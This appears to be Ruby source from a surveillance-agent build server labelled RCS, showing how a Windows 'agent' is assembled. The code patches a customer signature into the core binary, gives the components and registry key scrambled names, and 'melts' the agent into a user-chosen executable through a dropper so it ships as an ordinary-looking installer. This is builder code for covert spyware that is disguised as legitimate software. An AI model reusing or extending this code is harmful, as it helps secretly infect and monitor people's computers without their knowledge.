#
#  Agent creation for windows
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildWindows < Build

  def initialize
    super
    @platform = 'windows'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # remember the demo parameter
    @demo = params['demo']

    # overwrite the demo flag if the license doesn't allow it
    params['demo'] = true unless LicenseManager.instance.limits[:agents][:windows][0]

    # invoke the generic patch method with the new params
    super

    # we have an exception here, the core64 must be patched only with the signature
    file = File.open(path('core64'), 'rb+')
    content = file.read

    # per-customer signature
    begin
      sign = ::Signature.where({scope: 'agent'}).first
      signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
      content.gsub! 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
    rescue
      raise "Signature marker not found"
    end
    
    file.rewind
    file.write content
    file.close

  end

  def scramble
    trace :debug, "Build: scrambling"

    core = scramble_name(@factory.seed, 3)
    core_backup = scramble_name(core, 32)
    dir = scramble_name(core[0..7], 7)
    config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
    codec = scramble_name(config, 2)
    driver = scramble_name(config, 4)
    driver64 = scramble_name(config, 16)
    core64 = scramble_name(config, 15)
    reg = '*' + scramble_name(dir, 1)[1..-1]

    @scrambled = {core: core, core64: core64, driver: driver, driver64: driver64,
                  dir: dir, reg: reg, config: config, codec: codec }

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super
    
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    @appname = params['appname'] || 'install'
    @cooked = false

    manifest = (params['admin'] == true) ? '1' : '0'

    executable = path('default')

    # use the user-provided file to melt with
    if params['input']
      FileUtils.mv Config.instance.temp(params['input']), path('input')
      executable = path('input')
    end

    if params['cooked'] == true
      @cooked = true
      key = @factory.logkey.chr.ord
      key = "%02X" % ((key > 127) ? (key - 256) : key)

      # write the ini file
      File.open(path('cooker.ini'), 'w') do |f|
        f.puts "[RCS]"
        f.puts "HUID=#{@factory.ident}"
        f.puts "HCORE=#{@scrambled[:core]}"
        f.puts "HCONF=#{@scrambled[:config]}"
        f.puts "CODEC=#{@scrambled[:codec]}"
        f.puts "HDRV=#{@scrambled[:driver]}"
        f.puts "DLL64=#{@scrambled[:core64]}"
        f.puts "DRIVER64=#{@scrambled[:driver64]}"
        f.puts "HDIR=#{@scrambled[:dir]}"
        f.puts "HREG=#{@scrambled[:reg]}"
        f.puts "HSYS=ndisk.sys"
        f.puts "HKEY=#{key}"
        f.puts "MANIFEST=" + ((params['admin'] == true) ? 'yes' : 'no')
      end

      CrossPlatform.exec path('cooker'), '-C -R ' + path('') + ' -O ' + path('output')

    else

      # TODO: add the demo parameter for the dropper here

      CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                          path(@scrambled[:core64])+' '+
                                          path(@scrambled[:config])+' '+
                                          path(@scrambled[:driver])+' '+
                                          path(@scrambled[:driver64])+' '+
                                          path(@scrambled[:codec])+' '+
                                          @scrambled[:dir]+' '+
                                          manifest +' '+
                                          executable + ' ' +
                                          path('output')
    end
    
    File.exist? path('output') || raise("output file not created")

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    @outputs = ['output']
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open(@appname + (@cooked ? '.cooked' : '.exe'), "w") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
